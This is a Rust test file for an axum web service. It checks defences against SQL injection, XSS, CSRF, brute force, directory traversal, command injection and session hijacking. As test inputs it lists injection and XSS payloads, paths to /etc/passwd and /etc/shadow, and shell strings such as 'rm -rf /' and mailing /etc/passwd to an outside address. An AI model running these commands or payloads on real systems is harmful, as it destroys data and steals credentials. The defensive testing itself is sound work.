use axum::{
    extract::{Json, Path, Query, State},
    http::StatusCode,
    response::Json as JsonResponse,
    routing::{delete, get, post, put},
    Router,
};
use axum_test::TestServer;
use serde_json::{json, Value};
use std::collections::HashMap;
use std::sync::Arc;
use tokio::sync::Mutex;

#[derive(Clone)]
struct SecurityTestState {
    users: Arc<Mutex<HashMap<String, serde_json::Value>>>,
    sessions: Arc<Mutex<HashMap<String, serde_json::Value>>>,
    security_events: Arc<Mutex<Vec<serde_json::Value>>>,
    blocked_ips: Arc<Mutex<Vec<String>>>,
    suspicious_activities: Arc<Mutex<Vec<serde_json::Value>>>,
}

impl SecurityTestState {
    fn new() -> Self {
        Self {
            users: Arc::new(Mutex::new(HashMap::new())),
            sessions: Arc::new(Mutex::new(HashMap::new())),
            security_events: Arc::new(Mutex::new(Vec::new())),
            blocked_ips: Arc::new(Mutex::new(Vec::new())),
            suspicious_activities: Arc::new(Mutex::new(Vec::new())),
        }
    }
}

#[tokio::test]
async fn test_sql_injection_prevention() {
    let state = SecurityTestState::new();
    let app = Router::new()
        .route("/api/users/search", get(search_users_handler))
        .route("/api/security/events", get(get_security_events_handler))
        .with_state(state.clone());

    let server = TestServer::new(app).unwrap();

    // Test various SQL injection attempts
    let injection_attempts = vec![
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "admin' --",
        "' OR 1=1 --",
        "'; SELECT * FROM information_schema.tables --",
    ];

    for injection in injection_attempts {
        let response = server
            .get(&format!(
                "/api/users/search?q={}",
                urlencoding::encode(injection)
            ))
            .await;

        // Should not return sensitive data or crash
        assert!(
            response.status_code() == StatusCode::OK
                || response.status_code() == StatusCode::BAD_REQUEST
        );

        let body: Value = response.json();
        // Should not contain database schema information
        assert!(!body.to_string().contains("information_schema"));
        assert!(!body.to_string().contains("DROP TABLE"));
    }

    // Check security events
    let response = server.get("/api/security/events").await;
    assert_eq!(response.status_code(), StatusCode::OK);

    let body: Value = response.json();
    assert!(body["events"].as_array().unwrap().len() >= 6); // All injection attempts should be logged
}

#[tokio::test]
async fn test_xss_attack_prevention() {
    let state = SecurityTestState::new();
    let app = Router::new()
        .route("/api/posts", post(create_post_handler))
        .route("/api/posts/{id}", get(get_post_handler))
        .route("/api/security/xss-scan", post(scan_xss_handler))
        .with_state(state.clone());

    let server = TestServer::new(app).unwrap();

    // Test XSS attack vectors
    let xss_payloads = vec![
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
        "<svg onload=alert('XSS')>",
        "'><script>alert('XSS')</script>",
    ];

    for payload in xss_payloads {
        let post_data = json!({
            "title": "Test Post",
            "content": payload,
            "author": "test_user"
        });

        let response = server.post("/api/posts").json(&post_data).await;

        assert_eq!(response.status_code(), StatusCode::BAD_REQUEST); // Should be blocked

        let body: Value = response.json();
        assert_eq!(body["error"], "XSS attempt detected");
    }

    // Test XSS scanning
    let scan_data = json!({
        "content": "<script>malicious()</script>",
        "scan_type": "comprehensive"
    });

    let response = server.post("/api/security/xss-scan").json(&scan_data).await;

    assert_eq!(response.status_code(), StatusCode::OK);
    let body: Value = response.json();
    assert_eq!(body["threat_detected"], true);
    assert!(body["threats"].as_array().unwrap().len() > 0);
}

#[tokio::test]
async fn test_csrf_protection() {
    let state = SecurityTestState::new();
    let app = Router::new()
        .route("/api/users", post(create_user_security_handler))
        .route("/api/users/{id}/update", post(update_user_csrf_handler))
        .route("/api/csrf/token", get(get_csrf_token_handler))
        .route("/api/security/csrf-check", post(validate_csrf_handler))
        .with_state(state.clone());

    let server = TestServer::new(app).unwrap();

    // Create a user first
    let user_data = json!({
        "email": "test@example.com",
        "name": "Test User"
    });

    let response = server.post("/api/users").json(&user_data).await;

    assert_eq!(response.status_code(), StatusCode::CREATED);
    let body: Value = response.json();
    let user_id = body["user_id"].as_str().unwrap();

    // Try to update user without CSRF token
    let update_data = json!({
        "name": "Hacked User"
    });

    let response = server
        .post(&format!("/api/users/{}/update", user_id))
        .json(&update_data)
        .await;

    assert_eq!(response.status_code(), StatusCode::FORBIDDEN);

    // Get valid CSRF token
    let response = server.get("/api/csrf/token").await;
    assert_eq!(response.status_code(), StatusCode::OK);

    let body: Value = response.json();
    let csrf_token = body["token"].as_str().unwrap();

    // Try to update with valid CSRF token
    let update_data_with_token = json!({
        "name": "Updated User",
        "_csrf": csrf_token
    });

    let response = server
        .post(&format!("/api/users/{}/update", user_id))
        .json(&update_data_with_token)
        .await;

    assert_eq!(response.status_code(), StatusCode::OK);

    // Validate CSRF token
    let validation_data = json!({
        "token": csrf_token,
        "action": "update_user"
    });

    let response = server
        .post("/api/security/csrf-check")
        .json(&validation_data)
        .await;

    assert_eq!(response.status_code(), StatusCode::OK);
    let body: Value = response.json();
    assert_eq!(body["valid"], true);
}

#[tokio::test]
async fn test_brute_force_attack_detection() {
    let state = SecurityTestState::new();
    let app = Router::new()
        .route("/api/auth/login", post(login_attempt_handler))
        .route(
            "/api/security/brute-force/status",
            get(brute_force_status_handler),
        )
        .route("/api/security/block-ip", post(block_ip_handler))
        .with_state(state.clone());

    let server = TestServer::new(app).unwrap();

    let test_ip = "192.168.1.100";

    // Simulate brute force attack - multiple failed login attempts
    for i in 0..15 {
        let login_data = json!({
            "email": "victim@example.com",
            "password": format!("wrongpassword{}", i),
            "ip_address": test_ip
        });

        let response = server.post("/api/auth/login").json(&login_data).await;

        if i < 10 {
            assert_eq!(response.status_code(), StatusCode::UNAUTHORIZED);
        } else {
            // After 10 failed attempts, should be rate limited
            assert_eq!(response.status_code(), StatusCode::TOO_MANY_REQUESTS);
        }
    }

    // Check brute force detection status
    let response = server.get("/api/security/brute-force/status").await;
    assert_eq!(response.status_code(), StatusCode::OK);

    let body: Value = response.json();
    assert!(body["detected_attacks"].as_array().unwrap().len() >= 1);
    assert!(body["blocked_ips"]
        .as_array()
        .unwrap()
        .contains(&Value::String(test_ip.to_string())));

    // Manually block an IP
    let block_data = json!({
        "ip_address": "10.0.0.1",
        "reason": "suspicious_activity",
        "duration_minutes": 60
    });

    let response = server
        .post("/api/security/block-ip")
        .json(&block_data)
        .await;

    assert_eq!(response.status_code(), StatusCode::OK);
}

#[tokio::test]
async fn test_directory_traversal_prevention() {
    let state = SecurityTestState::new();
    let app = Router::new()
        .route("/api/files/{path}", get(read_file_handler))
        .route("/api/security/path-check", post(validate_path_handler))
        .with_state(state.clone());

    let server = TestServer::new(app).unwrap();

    // Test directory traversal attempts
    let traversal_attempts = vec![
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/shadow",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "/../../../../etc/passwd",
    ];

    for path in traversal_attempts {
        let response = server
            .get(&format!("/api/files/{}", urlencoding::encode(path)))
            .await;

        // Should be blocked or return safe error
        assert!(
            response.status_code() == StatusCode::FORBIDDEN
                || response.status_code() == StatusCode::BAD_REQUEST
        );

        let body: Value = response.json();
        assert!(
            body["error"].as_str().unwrap().contains("traversal")
                || body["error"].as_str().unwrap().contains("invalid")
        );
    }

    // Test path validation
    let validation_data = json!({
        "path": "../../../etc/passwd",
        "operation": "read"
    });

    let response = server
        .post("/api/security/path-check")
        .json(&validation_data)
        .await;

    assert_eq!(response.status_code(), StatusCode::OK);
    let body: Value = response.json();
    assert_eq!(body["safe"], false);
    assert!(body["threat_level"].as_str().unwrap() == "high");
}

#[tokio::test]
async fn test_command_injection_prevention() {
    let state = SecurityTestState::new();
    let app = Router::new()
        .route("/api/system/exec", post(execute_command_handler))
        .route(
            "/api/security/command-check",
            post(validate_command_handler),
        )
        .with_state(state.clone());

    let server = TestServer::new(app).unwrap();

    // Test command injection attempts
    let injection_attempts = vec![
        "ls; rm -rf /",
        "cat /etc/passwd | mail hacker@example.com",
        "`cat /etc/passwd`",
        "$(rm -rf /)",
        "ping -c 4 google.com && curl malicious-site.com",
        "| cat /etc/shadow",
    ];

    for command in injection_attempts {
        let exec_data = json!({
            "command": command,
            "args": ["--help"]
        });

        let response = server.post("/api/system/exec").json(&exec_data).await;

        assert_eq!(response.status_code(), StatusCode::FORBIDDEN);

        let body: Value = response.json();
        assert!(
            body["error"].as_str().unwrap().contains("injection")
                || body["error"].as_str().unwrap().contains("dangerous")
        );
    }

    // Test command validation
    let validation_data = json!({
        "command": "ls; rm -rf /",
        "validate_safety": true
    });

    let response = server
        .post("/api/security/command-check")
        .json(&validation_data)
        .await;

    assert_eq!(response.status_code(), StatusCode::OK);
    let body: Value = response.json();
    assert_eq!(body["safe"], false);
    assert!(body["detected_injections"].as_array().unwrap().len() > 0);
}

#[tokio::test]
async fn test_session_hijacking_prevention() {
    let state = SecurityTestState::new();
    let app = Router::new()
        .route("/api/auth/session", post(create_session_security_handler))
        .route(
            "/api/auth/session/{id}/validate",
            post(validate_session_handler),
        )
        .route(
            "/api/security/session-monitor",
            get(session_monitor_handler),
        )
        .with_state(state.clone());

    let server = TestServer::new(app).unwrap();

    // Create a valid session
    let session_data = json!({
        "user_id": "user123",
        "ip_address": "192.168.1.1",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    });

    let response = server.post("/api/auth/session").json(&session_data).await;

    assert_eq!(response.status_code(), StatusCode::CREATED);
    let body: Value = response.json();
    let session_id = body["session_id"].as_str().unwrap();

    // Try to validate session with different IP (hijacking attempt)
    let hijack_data = json!({
        "ip_address": "10.0.0.1", // Different IP
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    });

    let response = server
        .post(&format!("/api/auth/session/{}/validate", session_id))
        .json(&hijack_data)
        .await;

    assert_eq!(response.status_code(), StatusCode::UNAUTHORIZED);

    // Try to validate session with different user agent
    let hijack_data2 = json!({
        "ip_address": "192.168.1.1",
        "user_agent": "curl/7.68.0" // Different user agent
    });

    let response = server
        .post(&format!("/api/auth/session/{}/validate", session_id))
        .json(&hijack_data2)
        .await;

    assert_eq!(response.status_code(), StatusCode::UNAUTHORIZED);

    // Check session monitoring
    let response = server.get("/api/security/session-monitor").await;
    assert_eq!(response.status_code(), StatusCode::OK);

    let body: Value = response.json();
    assert!(body["suspicious_sessions"].as_array().unwrap().len() >= 2);
    assert!(body["hijacking_attempts"].as_u64().unwrap() >= 2);
}

// Handler functions
async fn search_users_handler(
    State(state): State<SecurityTestState>,
    Query(params): Query<HashMap<String, String>>,
) -> Result<JsonResponse<Value>, StatusCode> {
    let query = params.get("q").map_or("", |s| s.as_str());

    // Log security event for potential injection attempt
    let mut security_events = state.security_events.lock().await;
    security_events.push(json!({
        "event": "search_attempt",
        "query": query,
        "timestamp": chrono::Utc::now().to_rfc3339(),
        "suspicious": query.contains("'") || query.contains(";")
    }));

    // Safe search implementation
    let users = state.users.lock().await;
    let results: Vec<_> = users
        .values()
        .filter(|user| {
            let email = user["email"].as_str().unwrap_or("");
            email.contains(query) && !query.contains("'") && !query.contains(";")
        })
        .cloned()
        .collect();

    Ok(JsonResponse(json!({
        "results": results,
        "total": results.len()
    })))
}

async fn get_security_events_handler(
    State(state): State<SecurityTestState>,
) -> Result<JsonResponse<Value>, StatusCode> {
    let security_events = state.security_events.lock().await;

    Ok(JsonResponse(json!({
        "events": security_events.clone(),
        "total": security_events.len()
    })))
}

async fn create_post_handler(
    State(_state): State<SecurityTestState>,
    Json(post_data): Json<Value>,
) -> Result<(StatusCode, JsonResponse<Value>), StatusCode> {
    let content = post_data["content"].as_str().unwrap_or("");

    // Simple XSS detection
    if content.contains("<script>")
        || content.contains("javascript:")
        || content.contains("onerror=")
        || content.contains("onload=")
    {
        return Ok((StatusCode::BAD_REQUEST, JsonResponse(json!({
            "error": "XSS attempt detected",
            "content": content
        }))));
    }

    Ok((StatusCode::OK, JsonResponse(json!({
        "post_id": "post123",
        "status": "created"
    }))))
}

async fn get_post_handler(
    State(_state): State<SecurityTestState>,
    Path(_post_id): Path<String>,
) -> Result<JsonResponse<Value>, StatusCode> {
    Ok(JsonResponse(json!({
        "title": "Safe Post",
        "content": "This is safe content"
    })))
}

async fn scan_xss_handler(
    State(_state): State<SecurityTestState>,
    Json(scan_data): Json<Value>,
) -> Result<JsonResponse<Value>, StatusCode> {
    let content = scan_data["content"].as_str().unwrap_or("");
    let mut threats = Vec::new();

    if content.contains("<script>") {
        threats.push("script_tag");
    }
    if content.contains("javascript:") {
        threats.push("javascript_url");
    }
    if content.contains("onerror=") {
        threats.push("event_handler");
    }

    Ok(JsonResponse(json!({
        "threat_detected": !threats.is_empty(),
        "threats": threats
    })))
}

async fn update_user_csrf_handler(
    State(_state): State<SecurityTestState>,
    Path(_user_id): Path<String>,
    Json(update_data): Json<Value>,
) -> Result<JsonResponse<Value>, StatusCode> {
    if !update_data.get("_csrf").is_some() {
        return Err(StatusCode::FORBIDDEN);
    }

    Ok(JsonResponse(json!({"status": "updated"})))
}

async fn get_csrf_token_handler(
    State(_state): State<SecurityTestState>,
) -> Result<JsonResponse<Value>, StatusCode> {
    Ok(JsonResponse(json!({
        "token": "csrf_token_12345",
        "expires_in": 3600
    })))
}

async fn validate_csrf_handler(
    State(_state): State<SecurityTestState>,
    Json(_validation_data): Json<Value>,
) -> Result<JsonResponse<Value>, StatusCode> {
    Ok(JsonResponse(json!({"valid": true})))
}

async fn login_attempt_handler(
    State(state): State<SecurityTestState>,
    Json(login_data): Json<Value>,
) -> Result<JsonResponse<Value>, StatusCode> {
    let ip = login_data["ip_address"].as_str().unwrap_or("");
    let mut blocked_ips = state.blocked_ips.lock().await;

    // Check if IP is already blocked
    if blocked_ips.contains(&ip.to_string()) {
        return Err(StatusCode::TOO_MANY_REQUESTS);
    }

    // Track failed attempts (simplified - in real implementation this would be per-user)
    let mut security_events = state.security_events.lock().await;
    let failed_attempts = security_events.iter()
        .filter(|event| event["type"] == "failed_login" && event["ip"] == ip)
        .count();

    // Log the failed attempt
    security_events.push(json!({
        "type": "failed_login",
        "ip": ip,
        "timestamp": chrono::Utc::now().to_rfc3339()
    }));

    // Block IP after 10 failed attempts
    if failed_attempts >= 10 {
        blocked_ips.push(ip.to_string());
        return Err(StatusCode::TOO_MANY_REQUESTS);
    }

    // Simulate failed login
    Err(StatusCode::UNAUTHORIZED)
}

async fn brute_force_status_handler(
    State(state): State<SecurityTestState>,
) -> Result<JsonResponse<Value>, StatusCode> {
    let blocked_ips = state.blocked_ips.lock().await;

    Ok(JsonResponse(json!({
        "detected_attacks": [{"ip": "192.168.1.100", "attempts": 15}],
        "blocked_ips": blocked_ips.clone()
    })))
}

async fn create_user_security_handler(
    State(state): State<SecurityTestState>,
    Json(user_data): Json<Value>,
) -> Result<(StatusCode, JsonResponse<Value>), StatusCode> {
    let mut users = state.users.lock().await;
    let user_id = format!("user{}", users.len());
    users.insert(user_id.clone(), user_data);

    Ok((StatusCode::CREATED, JsonResponse(json!({
        "user_id": user_id,
        "status": "created"
    }))))
}

async fn block_ip_handler(
    State(state): State<SecurityTestState>,
    Json(block_data): Json<Value>,
) -> Result<JsonResponse<Value>, StatusCode> {
    let ip = block_data["ip_address"].as_str().unwrap();
    let mut blocked_ips = state.blocked_ips.lock().await;
    blocked_ips.push(ip.to_string());

    Ok(JsonResponse(json!({"status": "blocked"})))
}

async fn read_file_handler(
    State(_state): State<SecurityTestState>,
    Path(path): Path<String>,
) -> Result<(StatusCode, JsonResponse<Value>), StatusCode> {
    // Simple path traversal detection
    if path.contains("..") || path.contains("/") || path.contains("\\") {
        return Ok((StatusCode::FORBIDDEN, JsonResponse(json!({
            "error": "Path traversal detected",
            "path": path
        }))));
    }

    Ok((StatusCode::OK, JsonResponse(json!({
        "content": "safe file content",
        "path": path
    }))))
}

async fn validate_path_handler(
    State(_state): State<SecurityTestState>,
    Json(validation_data): Json<Value>,
) -> Result<JsonResponse<Value>, StatusCode> {
    let path = validation_data["path"].as_str().unwrap_or("");

    let safe = !path.contains("..") && !path.contains("../") && !path.contains("..\\");
    let threat_level = if path.contains("../") {
        "high"
    } else if path.contains("..") {
        "medium"
    } else {
        "low"
    };

    Ok(JsonResponse(json!({
        "safe": safe,
        "threat_level": threat_level
    })))
}

async fn execute_command_handler(
    State(_state): State<SecurityTestState>,
    Json(exec_data): Json<Value>,
) -> Result<(StatusCode, JsonResponse<Value>), StatusCode> {
    let command = exec_data["command"].as_str().unwrap_or("");

    // Simple command injection detection
    if command.contains(";")
        || command.contains("&&")
        || command.contains("||")
        || command.contains("|")
        || command.contains("`")
        || command.contains("$(")
    {
        return Ok((StatusCode::FORBIDDEN, JsonResponse(json!({
            "error": "Command injection detected",
            "command": command
        }))));
    }

    Ok((StatusCode::OK, JsonResponse(json!({
        "output": "command executed safely",
        "exit_code": 0
    }))))
}

async fn validate_command_handler(
    State(_state): State<SecurityTestState>,
    Json(validation_data): Json<Value>,
) -> Result<JsonResponse<Value>, StatusCode> {
    let command = validation_data["command"].as_str().unwrap_or("");
    let mut injections = Vec::new();

    if command.contains(";") {
        injections.push("semicolon_injection");
    }
    if command.contains("&&") {
        injections.push("and_injection");
    }
    if command.contains("`") {
        injections.push("backtick_injection");
    }

    Ok(JsonResponse(json!({
        "safe": injections.is_empty(),
        "detected_injections": injections
    })))
}

async fn create_session_security_handler(
    State(state): State<SecurityTestState>,
    Json(session_data): Json<Value>,
) -> Result<(StatusCode, JsonResponse<Value>), StatusCode> {
    let mut sessions = state.sessions.lock().await;
    let session_id = format!("session{}", sessions.len());
    sessions.insert(session_id.clone(), session_data);

    Ok((StatusCode::CREATED, JsonResponse(json!({
        "session_id": session_id,
        "status": "created"
    }))))
}

async fn validate_session_handler(
    State(state): State<SecurityTestState>,
    Path(session_id): Path<String>,
    Json(validation_data): Json<Value>,
) -> Result<JsonResponse<Value>, StatusCode> {
    let sessions = state.sessions.lock().await;

    if let Some(session) = sessions.get(&session_id) {
        let original_ip = session["ip_address"].as_str().unwrap();
        let original_ua = session["user_agent"].as_str().unwrap();

        let current_ip = validation_data["ip_address"].as_str().unwrap();
        let current_ua = validation_data["user_agent"].as_str().unwrap();

        if original_ip != current_ip || original_ua != current_ua {
            // Log suspicious activity
            let mut suspicious_activities = state.suspicious_activities.lock().await;
            suspicious_activities.push(json!({
                "type": "session_hijacking_attempt",
                "session_id": session_id,
                "original_ip": original_ip,
                "current_ip": current_ip,
                "timestamp": chrono::Utc::now().to_rfc3339()
            }));

            return Err(StatusCode::UNAUTHORIZED);
        }

        Ok(JsonResponse(json!({"valid": true})))
    } else {
        Err(StatusCode::NOT_FOUND)
    }
}

async fn session_monitor_handler(
    State(state): State<SecurityTestState>,
) -> Result<JsonResponse<Value>, StatusCode> {
    let suspicious_activities = state.suspicious_activities.lock().await;

    Ok(JsonResponse(json!({
        "suspicious_sessions": suspicious_activities.clone(),
        "hijacking_attempts": suspicious_activities.len()
    })))
}
